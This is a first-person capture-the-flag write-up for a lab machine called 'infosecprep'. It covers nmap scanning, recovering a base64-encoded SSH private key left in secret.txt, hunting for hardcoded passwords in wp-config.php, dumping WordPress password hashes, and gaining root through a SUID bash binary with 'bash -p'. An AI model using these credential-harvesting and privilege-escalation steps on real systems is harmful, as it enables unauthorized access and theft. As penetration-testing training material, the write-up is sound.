### Reconnaisance

The first step starts with, as always, some recon.
Running `nmap` shows that the target has port 80 and 22 open.

`nmap -Pn -F infosecprep`

```
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-06-05 12:10 +0545
Nmap scan report for infosecprep (192.168.242.89)
Host is up (0.17s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds

```

Then I tried to look at these ports in detail.

`nmap -Pn -sC -sV -p 22 infosecprep`

```
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-06-05 12:12 +0545
Nmap scan report for infosecprep (192.168.242.89)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds

```

This shows that the target is running a fairly recent version of OpenSSH.
Being aware about the quality software that the OpenBSD project makes,
I didn't try looking at this any more deeper.

### Obtaining Secrets

So let's try the HTTP port.

`nmap -Pn -sC -sV -p 80 infosecprep`

```
Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-06-05 12:09 +0545
Nmap scan report for infosecprep (192.168.242.89)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &#8211; Just another WordPress site
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-generator: WordPress 5.4.2

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds

```

Nmap has identified a `robots.txt` entry which piques my interest. Let's see what
that contains.

`curl -L infosecprep/robots.txt`

```
User-Agent: *
Disallow: /secret.txt

```

Interesting! Let's see what that `secret.txt` file contains.

`wget infosecprep/secret.txt && cat secret.txt`

```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
.
.
.
T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==

```

Hmm... That's a rather long string (I’ve omitted the full output).

From my experience with `base64`, I have noticed that most of the base64 encoded
strings have a `==` at the end. Furthermore, by default `base64` wraps lines
at the 76th character.

`head -n 1 secret.txt | wc -c`

This outputs 77 which includes the additional newline at the end. So I can be
fairly certain this is base64 encoded. Let's decode that.

`base64 -d secret.txt`

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
.
.
.
kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----

```

Would you look at that? I have the ssh identity key (private key).

### Getting In

On the initial ssh port scan, the target machine gave me public keys for three
algorithms: RSA, ECDSA and ED25519.

Although, I have yet to learn about Elliptic curves and the whole world of
cryptography, I once came across Daniel Bernstein's (that guy is a genius!)
paper on ED25519: [https://ed25519.cr.yp.to/papers.html](https://ed25519.cr.yp.to/papers.html). He mentions the fact
that the algorithm has smaller keys, much smaller than RSA. And from my
experience using SSH (I have switched to ED25519 keypairs from RSA), I know that
the latter (ECDSA, ED25519) two algorithms in fact have smaller keys. So looking
at the length of what we just got, it must be an RSA private key.

Not that the algorithm matters in this case and I also usually don't think THAT
much when taking guesses, I just wanted to show how my intuition about various
things has developed (keys in this case) from seemingly random facts I stumble
across online.

So let's put that into a file `id_rsa`, fix permissions with `chmod 600 id_rsa`
and try logging in to the ssh server as... Wait a minute. Which user should I login
as?

After getting denied as root, I realised I'd probably have to enumerate on the
usernames. However, that will probably take a lot of time. Furthermore, this is
supposed to be an easy challenge. So I thought it best to try the easiest
option first.

*A wise hacker chooses the easiest path to success.* - Sun Tzu

I realised that I hadn't looked into that port 80 well enough. I loaded the page
into my browser and reading what was on there revealed that the machine had the
user `oscp` on it. Logging in as that user with the private key got me in.

There was a file `local.txt` and there was one of our flag. I submitted it and
it was correct.

### (Failing at) Getting the Root Flag

Now for the root flag.

Let's look at what users are on the system.

`cat /etc/passwd`

One of the users is `mysql`. The website is also hosting itself as a web server.
The web server's Apache. Maybe I need to look into the `/var/www/html` page.

There are some php scripts there. But I am too lazy to inspect each one. All I
care about is perhaps the admin has left in some hardcoded passwords for the
website. Let's look for the password string.

`grep -R 'password' /var/www/html/`

This spit out a ton of output. However, my eyes landed on a file
`wp-config-sample.php` which contains some credentials. Looking at the suffix of
the file name i.e. sample this was probably not what I needed. Fortunately,
there was another file `wp-config.php` and in it, were the hardcoded credentials.

I got the credentials for the `wordpress` mysql user and there I could dump
the contents of the `wp_users` table. It had the `admin` user's password hash.
After failing to crack the password, I started to realise I was probably on the
wrong path. This is supposed to be an easy challenge, after all.

### (For real) Getting the Root Flag

After looking around a while (no actually, I was stuck at this for 2 days), I
noticed the command line had that `-bash-5.0$` as the prompt. This should signify
a login prompt but it reminded me of what Prashant dai suggested us: *look for
suid binaries*.

`find /usr/bin/ -type f -perm -4000`

```
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/bash
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su

```

And immediately, the fact that `/usr/bin/bash` had been set UID as root all the
time made me quite confident that this was what I was supposed to use for
privilege escalation.

Well, yeah, but how?

After digging around in the bash man page - which is apparently a huuuge
document - I came across the 'INVOCATION' section which mentions that the -p
option will not reset the effective user id. And it was all just guess work from
then.

`bash -p`

And all of a sudden...

```
-bash-5.0$ bash -p
bash-5.0#

```

I was root!

And yeah that's how the root flag was discovered.

Good game.
